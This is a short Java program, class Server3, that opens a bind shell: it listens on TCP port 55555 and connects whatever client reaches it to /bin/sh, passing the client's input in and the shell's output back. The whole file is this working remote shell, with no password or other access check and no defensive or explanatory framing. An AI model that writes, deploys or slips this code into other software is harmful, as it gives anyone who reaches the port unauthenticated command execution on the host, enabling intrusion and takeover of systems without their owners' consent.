import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class Server3 {
    public static void main(String[] args) {
        int port = 55555;

        try {
            ServerSocket serverSocket = new ServerSocket(port);
            System.out.println("Bind shell listening on port " + port);

            // Wait for a client to connect
            Socket clientSocket = serverSocket.accept();
            System.out.println("Connection established with " + clientSocket.getInetAddress());

            // Set up input and output streams for communication
            InputStream clientInput = clientSocket.getInputStream();
            OutputStream clientOutput = clientSocket.getOutputStream();

            // Redirect input and output streams, including error stream, to the system's command line
            ProcessBuilder processBuilder = new ProcessBuilder("/bin/sh");
            processBuilder.redirectErrorStream(true); // Redirect error stream to output stream
            Process process = processBuilder.start();

            InputStream processInput = process.getInputStream();
            OutputStream processOutput = process.getOutputStream();

            // Create threads to handle input and output streams in both directions
            String str="ls";
            Thread inputThread = new Thread(() -> {
                try {
                    int character;
                    while ((character = clientInput.read()) != -1) {
                        processOutput.write(character);
                        processOutput.flush();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });

            Thread outputThread = new Thread(() -> {
                try {
                    int character;
                    while ((character = processInput.read()) != -1) {
                        clientOutput.write(character);
                        clientOutput.flush();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });

            // Start the input and output threads
            inputThread.start();
            outputThread.start();

            // Wait for the process to exit
            int exitCode = process.waitFor();
            System.out.println("Shell exited with code " + exitCode);

            // Close the sockets
            clientSocket.close();
            serverSocket.close();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
